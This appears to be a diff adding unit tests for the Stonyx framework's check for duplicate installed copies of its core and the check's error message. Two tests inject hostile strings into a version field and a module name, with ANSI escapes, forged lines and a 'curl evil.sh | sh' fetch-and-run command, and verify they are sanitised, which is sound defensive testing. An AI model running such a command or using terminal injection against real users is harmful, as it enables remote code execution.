+  // the exact failure #108 exists to remove. The fallback survived every
+  // mutation until this test.
+  test('D16: a nested core with no version is still reported, as "unknown"', function(assert) {
+    const rootPath = root({ name: 'd16-app' });
+    installModule(rootPath, '@stonyx/d16-mod', { main: 'main.js', keywords: [ 'stonyx-module' ]});
+    symlinkSync(repoRoot, join(rootPath, 'node_modules', 'stonyx'), 'dir');
+
+    const nested = join(rootPath, 'node_modules', '@stonyx/d16-mod', 'node_modules', 'stonyx');
+
+    mkdirSync(nested, { recursive: true });
+    writeFileSync(join(nested, 'package.json'), JSON.stringify({ name: 'stonyx', type: 'module' }));
+
+    const moduleDir = join(rootPath, 'node_modules', '@stonyx/d16-mod');
+    const foreign = findForeignCores([ { name: '@stonyx/d16-mod', dir: moduleDir } ]);
+
+    assert.strictEqual(coreSeenBy(moduleDir)?.root, nested, 'the versionless copy is still resolved');
+    assert.strictEqual(coreSeenBy(moduleDir)?.version, 'unknown', 'and reported as "unknown" rather than dropped');
+    assert.strictEqual(foreign.length, 1, 'so the duplicate is still detected');
+    assert.ok(duplicateCoreMessage(foreign).includes('unknown'), 'and the diagnostic says so instead of printing nothing');
+  });
+
+  // D4 — the message. #108 was filed because the OLD message named a file that
+  // was present and a module that had not failed; asserting on the presence of
+  // the two resolved paths is the part that cannot be produced by accident.
+  test('D4: the diagnostic names the module, both absolute paths, both versions and the remedy', function(assert) {
+    const foreign: ForeignCore[] = [ {
+      moduleName: '@stonyx/cron',
+      moduleCore: { root: '/app/node_modules/@stonyx/cron/node_modules/stonyx', version: '0.2.3-beta.94' },
+      runningCore: { root: '/app/node_modules/stonyx', version: '0.2.3-beta.96' },
+    } ];
+    const message = duplicateCoreMessage(foreign);
+
+    assert.ok(message.includes('@stonyx/cron'), 'names the module');
+    assert.ok(message.includes('/app/node_modules/stonyx'), 'names the running core path');
+    assert.ok(message.includes('/app/node_modules/@stonyx/cron/node_modules/stonyx'), 'names the module\'s core path');
+    assert.ok(message.includes('0.2.3-beta.96'), 'names the running core version');
+    assert.ok(message.includes('0.2.3-beta.94'), 'names the module\'s core version');
+    assert.ok(message.includes('peerDependencies'), 'gives the module author\'s remedy');
+    assert.ok(message.includes('pin stonyx@0.2.3-beta.94'), 'and the consumer\'s interim remedy');
+    assert.ok(message.includes('Scope of this check'), 'and states what it does NOT cover');
+    assert.notOk(message.includes('config/environment'), 'and never mentions config/environment — that was the false claim');
+  });
+
+  // D9 — the copy COUNT and the pin advice, both found wrong by running the
+  // check against a real `stonyx new` tree rather than a fixture.
+  //
+  // `foreign.length + 1` was right on that tree by coincidence (three modules,
+  // three different copies) and is wrong whenever two modules share one nested
+  // copy — which is the commonest npm shape, since siblings on the same exact
+  // pin dedupe with each other. And "pin stonyx@<first foreign version>" is
+  // advice that cannot work when the modules disagree among themselves; the
+  // message this one replaces was wrong for exactly that reason, so it must
+  // not assert more than it knows.
+  test('D9: counts DISTINCT roots, and offers a pin only when the foreign versions agree AND differ from the running core', function(assert) {
+    const runningCore = { root: '/app/node_modules/stonyx', version: '0.2.3-beta.96' };
+    const shared = { root: '/app/node_modules/.pnpm/stonyx@0.2.3-beta.94/node_modules/stonyx', version: '0.2.3-beta.94' };
+
+    const agreeing = duplicateCoreMessage([
+      { moduleName: '@stonyx/cron', moduleCore: shared, runningCore },
+      { moduleName: '@stonyx/orm', moduleCore: shared, runningCore },
+    ]);
+
+    assert.ok(agreeing.startsWith('Stonyx: 2 copies'), `two modules on one copy is TWO copies, got: ${agreeing.split('\n')[0]}`);
+    assert.ok(agreeing.includes('pin stonyx@0.2.3-beta.94'), 'and one pin does reconcile them');
+
+    const disagreeing = duplicateCoreMessage([
+      { moduleName: '@stonyx/cron', moduleCore: shared, runningCore },
+      { moduleName: '@stonyx/sockets', moduleCore: { root: '/app/node_modules/.pnpm/stonyx@0.2.3-beta.62/node_modules/stonyx', version: '0.2.3-beta.62' }, runningCore },
+    ]);
+
+    assert.ok(disagreeing.startsWith('Stonyx: 3 copies'), `three distinct roots is THREE copies, got: ${disagreeing.split('\n')[0]}`);
+    assert.notOk(disagreeing.includes('pin stonyx@'), 'and no pin is offered, because none would work');
+    assert.ok(disagreeing.includes('must be republished'), 'the remedy names what would actually fix it');
+
+    // The third case, and the one the `versions.length === 1` guard got wrong:
+    // the versions agree with EACH OTHER and with the running core. That is the
+    // shape `npm install -g stonyx` plus `stonyx new` produces — global CLI,
+    // local core, same version, two roots. The old guard told that consumer to
+    // pin the version their running core already is, a pin already in effect
+    // and demonstrably not deduping. The trigger is distinct ROOTS; the advice
+    // was keyed on versions.
+    const sameVersion = duplicateCoreMessage([
+      { moduleName: '@stonyx/cron', moduleCore: { root: '/app/node_modules/@stonyx/cron/node_modules/stonyx', version: '0.2.3-beta.96' }, runningCore },
+    ]);
+
+    assert.ok(sameVersion.startsWith('Stonyx: 2 copies'), `got: ${sameVersion.split('\n')[0]}`);
+    assert.notOk(sameVersion.includes('pin stonyx@'), 'no pin is offered when every copy is already that version');
+    assert.ok(sameVersion.includes('duplicate INSTALL'), 'it is named as a duplicate install instead');
+    assert.ok(sameVersion.includes('node_modules/.bin/stonyx'), 'and the remedy is the one that actually applies');
+  });
+
+  // D14 — the diagnostic renders THIRD-PARTY manifest data. `version` is read
+  // from a package this app did not write, echoed verbatim into a terminal, and
+  // rendered BEFORE any module entry point is imported — so it is reachable
+  // under `npm install --ignore-scripts`, the one mode in which no attacker
+  // code has otherwise run. Seeded with ANSI escapes and newlines it forged its
+  // own lines inside the message and destroyed the column alignment.
+  test('D14: a hostile version string cannot forge lines or escapes in the diagnostic', function(assert) {
+    const runningCore = { root: '/app/node_modules/stonyx', version: '0.2.3-beta.96' };
+    const hostile = '1.0.0\u001b[31m\n\n  ===> ALERT: run `curl evil.sh | sh` to repair your install <===\n' + 'x'.repeat(200);
+    const message = duplicateCoreMessage([
+      { moduleName: '@stonyx/mod', moduleCore: { root: '/app/node_modules/@stonyx/mod/node_modules/stonyx', version: hostile }, runningCore },
+    ]);
+
+    // CONTROL, same shape, benign version: the value IS rendered, so a failure
+    // to find the hostile text below is sanitisation and not a missing row.
+    const control = duplicateCoreMessage([
+      { moduleName: '@stonyx/mod', moduleCore: { root: '/app/node_modules/@stonyx/mod/node_modules/stonyx', version: '9.9.9-benign' }, runningCore },
+    ]);
+
+    assert.ok(control.includes('9.9.9-benign'), 'control: a benign version is rendered verbatim');
+    assert.notOk(message.includes('\u001b'), 'no ESC survives into the message');
+    assert.deepEqual(
+      message.split('\n').filter(line => line.trimStart().startsWith('===>')),
+      [],
+      'the text the manifest tried to inject never gets a line of its own — the forgery was the newline, not the words'
+    );
+    assert.strictEqual(
+      message.split('\n').length,
+      control.split('\n').length,
+      'the hostile value adds no lines: the message has exactly the same shape as the benign one'
+    );
+    assert.ok(message.includes('1.0.0?'), 'the value is still shown, with the non-printable bytes replaced');
+    assert.ok(message.includes('...'), 'and clamped, so it cannot push the rest of the message off screen');
+  });
+
+  // D20 — the same forgery as D14, in the sibling field that was left raw.
+  //
+  // `moduleName` was interpolated unsanitised at three sites (the row label,
+  // and the remedy's name list twice) while `version` and `root` beside it were
+  // sanitised — including the root DERIVED FROM THAT SAME NAME, in the very
+  // same row. It is narrower than D14: the value is a key out of the app's own
+  // `devDependencies`, not third-party manifest data, so this is an app author
+  // forging their own diagnostic. It is closed anyway, because the two symptoms
+  // are identical — a complete forged table row, and `padEnd` widths computed
+  // from a multi-line label, which destroys the alignment of every other row.
+  test('D20: a hostile module name cannot forge a table row or break the alignment', function(assert) {
+    const runningCore = { root: '/real/node_modules/stonyx', version: '0.2.3-beta.96' };
+    const moduleCore = { root: '/real/node_modules/@stonyx/mod/node_modules/stonyx', version: '0.0.0-nested' };
+    const hostile = '@stonyx/p\u001b[31m\n  running core             0.0.0-SPOOF  /app/attacker\n' +
+      '  ===> ALERT: run `curl evil.sh | sh` to repair your install <===\nx';
+    const message = duplicateCoreMessage([ { moduleName: hostile, moduleCore, runningCore } ]);
+
+    // CONTROL, same shape, benign name: the value IS rendered at every site, so
+    // a failure to find the hostile text below is sanitisation and not a
+    // missing row or a swallowed name.
+    const control = duplicateCoreMessage([ { moduleName: '@stonyx/benign', moduleCore, runningCore } ]);
+
+    assert.ok(control.includes('seen by "@stonyx/benign"'), 'control: a benign name is rendered verbatim in the row label');
+    assert.strictEqual(
+      control.split('"@stonyx/benign"').length - 1,
+      3,
+      'control: and at all three interpolation sites — the label plus the two remedy sentences'
+    );
+
+    assert.notOk(message.includes('\u001b'), 'no ESC survives into the message');
+    assert.deepEqual(
+      message.split('\n').filter(line => line.trimStart().startsWith('===>')),
+      [],
+      'the text the name tried to inject never gets a line of its own'
+    );
+    assert.strictEqual(
+      message.split('\n').filter(line => line.trimStart().startsWith('running core')).length,
+      1,
+      'the table still has exactly ONE "running core" row — the forgery was the newline, not the words, so the payload survives as text on the one line the name occupies'
+    );
+    assert.strictEqual(
+      message.split('\n').length,
+      control.split('\n').length,
+      'the hostile value adds no lines: the message has exactly the same shape as the benign one'
+    );
+
+    // ALIGNMENT — the second symptom, and the one a `notOk` on ESC would miss.
+    // `labelWidth` is computed from the raw label, so an embedded newline makes
+    // every other row's padding wrong even after the escapes are stripped.
+    const columns = (rendered: string): number[] =>
+      rendered.split('\n').filter(line => line.startsWith('  ') && line.includes('/real')).map(line => line.indexOf('/real'));
+
+    assert.strictEqual(columns(control).length, 2, 'premise: the table is two rows');
+    assert.strictEqual(new Set(columns(message)).size, 1, 'both roots still start at the same column');
+    // NOT "the same column as the benign message" — a longer label legitimately
+    // widens the column, and asserting otherwise would assert more than the
+    // guard does. The property is that the CLAMP sets the width, not the
+    // payload: any over-long name buys exactly the same column.
+    const alsoOverLong = duplicateCoreMessage([ { moduleName: `@stonyx/${'n'.repeat(300)}`, moduleCore, runningCore } ]);
+
+    assert.deepEqual(columns(message), columns(alsoOverLong), 'and the hostile name buys no more width than any other over-long name');
+    assert.ok(columns(control)[0]! < columns(message)[0]!, 'liveness: a short name really does produce a narrower table, so this measurement can move');
+    assert.ok(message.includes('@stonyx/p?'), 'the name is still shown, with the non-printable bytes replaced');
+    assert.ok(message.includes('...'), 'and clamped, because the label is a PADDED column: an unclamped name pushes every other row off screen');
+
+    // ...and the clamp does not cost anything real. The row label is the one
+    // place a truncated name would be an instruction that does not work, so a
+    // realistic scoped name has to survive whole.
+    const longButReal = duplicateCoreMessage([ { moduleName: '@stonyx/a-deliberately-long-module-name', moduleCore, runningCore } ]);
+
+    assert.ok(longButReal.includes('seen by "@stonyx/a-deliberately-long-module-name"'), 'a realistic scoped name is never shortened');
+  });
+});
+
+module('[Unit] loadModules pre-flight', function(hooks) {
+  hooks.afterEach(function() {
+    while (roots.length) removeRoot(roots.pop()!);
+  });
+
+  // D5 — the reason this is a PRE-FLIGHT and not a better catch. A module that
+  // does not touch `Stonyx.config` at load time never throws; it initialises
+  // against a second singleton and reports success. So the assertion is that
+  // the entry point was never EVALUATED, with the sentinel's own liveness
+  // proven in the same test.
+  test('D5: throws before any module entry point is imported', async function(assert) {
+    const clean = root({ name: 'd5-clean-app', devDependencies: { '@stonyx/d5-clean': '1.0.0' }});
+    const cleanSentinel = installFixtureModule(clean, '@stonyx/d5-clean', 'D5Clean');
+    symlinkSync(repoRoot, join(clean, 'node_modules', 'stonyx'), 'dir');
+
+    await loadModules({}, clean, stubChronicle().asChronicle());
+
+    assert.ok(existsSync(cleanSentinel), 'premise: with one core the entry point IS evaluated (sentinel is live)');
+
+    const dup = root({ name: 'd5-dup-app', devDependencies: { '@stonyx/d5-dup': '1.0.0' }});
+    const dupSentinel = installFixtureModule(dup, '@stonyx/d5-dup', 'D5Dup');
+    symlinkSync(repoRoot, join(dup, 'node_modules', 'stonyx'), 'dir');
+    installNestedCore(dup, '@stonyx/d5-dup', '0.0.0-nested');
+
+    let error: Error | undefined;
+
+    try {
+      await loadModules({}, dup, stubChronicle().asChronicle());
+    } catch (err) {
+      error = err as Error;
+    }
+
+    assert.ok(error, 'the duplicated tree refuses to boot');
+    assert.ok(error?.message.startsWith('Stonyx: 2 copies of the framework are installed'), `got: ${error?.message}`);
+    assert.ok(error?.message.includes('0.0.0-nested'), 'and names the version the module would have imported');
+    assert.notOk(existsSync(dupSentinel), 'and the module entry point was never evaluated');
+  });
+
+  /** Drives `loadModules` and reports what happened, warnings included. */
+  async function boot(rootPath: string): Promise<{ error?: Error; warnings: string[] }> {
+    const capture = captureConsole();
+
+    try {
+      await loadModules({}, rootPath, stubChronicle().asChronicle());
+
+      return { warnings: capture.warnings };
+    } catch (error) {
+      return { error: error as Error, warnings: capture.warnings };
+    } finally {
+      capture.restore();
+    }
+  }
+
+  // D12 — SCOPE. The pre-flight must check what the loader LOADS, not what
+  // matches `@stonyx/*`. A scoped devDependency with no `stonyx-module` keyword
+  // is warned about and skipped by the loader — never imported, never given a
+  // config, incapable of registering anything on any singleton — and refusing
+  // over its nested copy prescribed the module-author remedy ("declare stonyx
+  // in devDependencies plus a non-optional peerDependencies range") to a
+  // package that is not a module.
+  //
+  // Two controls, so a green here cannot come from an inert harness: the SAME
+  // fixture with the keyword added does refuse, and the same non-module WITHOUT
+  // a nested core also boots (so this is not reporting on absence).
+  test('D12: a scoped dependency the loader skips does not refuse the boot', async function(assert) {
+    const rootPath = root({ name: 'd12-app', devDependencies: { '@stonyx/d12-not-a-module': '1.0.0' }});
+    installModule(rootPath, '@stonyx/d12-not-a-module', { main: 'main.js', keywords: [ 'some-other-thing' ]});
+    symlinkSync(repoRoot, join(rootPath, 'node_modules', 'stonyx'), 'dir');
+    installNestedCore(rootPath, '@stonyx/d12-not-a-module', '0.0.0-d12');
+
+    const skipped = await boot(rootPath);
+
+    assert.notOk(skipped.error, `a package the loader skips does not brick the boot, got: ${skipped.error?.message}`);
+    assert.ok(
+      skipped.warnings.some(warning => warning.includes('must contain the "stonyx-module" keyword')),
+      'and the loader still says why it skipped it'
+    );
+
+    const control = root({ name: 'd12-control-app', devDependencies: { '@stonyx/d12-is-a-module': '1.0.0' }});
+    // ASYNC control on purpose: D13 owns the sync arm, and a mutation that
+    // exempts sync modules must red D13 alone rather than both.
+    installFixtureModule(control, '@stonyx/d12-is-a-module', 'D12IsAModule');
+    symlinkSync(repoRoot, join(control, 'node_modules', 'stonyx'), 'dir');
+    installNestedCore(control, '@stonyx/d12-is-a-module', '0.0.0-d12');
+
+    const withKeyword = await boot(control);
+
+    assert.ok(
+      withKeyword.error?.message.startsWith('Stonyx: 2 copies'),
+      `control: the identical tree WITH the keyword is refused, got: ${withKeyword.error?.message}`
+    );
+
+    const noCore = root({ name: 'd12-nocore-app', devDependencies: { '@stonyx/d12-plain': '1.0.0' }});
+    installModule(noCore, '@stonyx/d12-plain', { main: 'main.js', keywords: [ 'some-other-thing' ]});
+    symlinkSync(repoRoot, join(noCore, 'node_modules', 'stonyx'), 'dir');
+
+    assert.notOk((await boot(noCore)).error, 'control: and a non-module with no nested core boots too');
+  });
+
+  // D13 — the SYNC arm, which is the most consumer-visible change in #108 and
+  // was measured only against `stonyx-async` fixtures before this round. Every
+  // D1-D9 and acceptance fixture carries `stonyx-async`; a `stonyx-module`-only
+  // module with a skewed pin is the case that flips from BOOTING to a hard
+  // refusal, and docs/modules.md documented it as "booted, exit 0, no warning".
+  //
+  // It is refused deliberately: the loader never imports a sync module, so its
+  // second singleton never announces itself, and that invisibility is the whole
+  // reason I1 is a pre-flight. The keyword is no longer the variable.
+  test('D13: a SYNC-only module with a second core is refused, and the same module with one core boots', async function(assert) {
+    const dup = root({ name: 'd13-dup-app', devDependencies: { '@stonyx/d13-sync': '1.0.0' }});
+    installModule(dup, '@stonyx/d13-sync', { main: 'main.js', keywords: [ 'stonyx-module' ]});
+    symlinkSync(repoRoot, join(dup, 'node_modules', 'stonyx'), 'dir');
+    installNestedCore(dup, '@stonyx/d13-sync', '0.0.0-d13-nested');
+
+    const refused = await boot(dup);
+
+    assert.ok(refused.error?.message.startsWith('Stonyx: 2 copies'), `got: ${refused.error?.message}`);
+    assert.ok(refused.error?.message.includes('0.0.0-d13-nested'), 'naming the copy the sync module would have imported');
+    assert.ok(refused.error?.message.includes('@stonyx/d13-sync'), 'and the module, which carries no stonyx-async keyword');
+
+    const clean = root({ name: 'd13-clean-app', devDependencies: { '@stonyx/d13-sync-clean': '1.0.0' }});
+    installModule(clean, '@stonyx/d13-sync-clean', { main: 'main.js', keywords: [ 'stonyx-module' ]});
+    symlinkSync(repoRoot, join(clean, 'node_modules', 'stonyx'), 'dir');
+
+    const booted = await boot(clean);
+
+    assert.notOk(booted.error, `control: the identical sync module with ONE core boots, got: ${booted.error?.message}`);
+    assert.deepEqual(booted.warnings, [], 'control: silently — so the refusal above is the second core, not the keyword');
+  });
+
+  // D6 — the tree #108 measured has THREE copies, not two. Reporting only the
+  // first offender makes the consumer fix one pin, re-run, and meet the same
+  // failure — the "partial rollout produces no observable improvement" trap.
+  test('D6: reports every offending module, not just the first', async function(assert) {
+    const rootPath = root({
+      name: 'd6-app',
+      devDependencies: { '@stonyx/d6-a': '1.0.0', '@stonyx/d6-b': '1.0.0' },
+    });
+    installFixtureModule(rootPath, '@stonyx/d6-a', 'D6A');
+    installFixtureModule(rootPath, '@stonyx/d6-b', 'D6B');
+    symlinkSync(repoRoot, join(rootPath, 'node_modules', 'stonyx'), 'dir');
+    installNestedCore(rootPath, '@stonyx/d6-a', '0.0.0-a');
+    installNestedCore(rootPath, '@stonyx/d6-b', '0.0.0-b');
+
+    let error: Error | undefined;
+
+    try {
+      await loadModules({}, rootPath, stubChronicle().asChronicle());
+    } catch (err) {
+      error = err as Error;
+    }
+
+    assert.ok(error?.message.includes('@stonyx/d6-a'), 'names the first offender');
+    assert.ok(error?.message.includes('@stonyx/d6-b'), 'and the second');
+    assert.ok(error?.message.includes('0.0.0-a') && error?.message.includes('0.0.0-b'), 'with both versions');
+    assert.ok(error?.message.startsWith('Stonyx: 3 copies'), `and counts all three copies, got: ${error?.message.split('\n')[0]}`);
+  });
+});
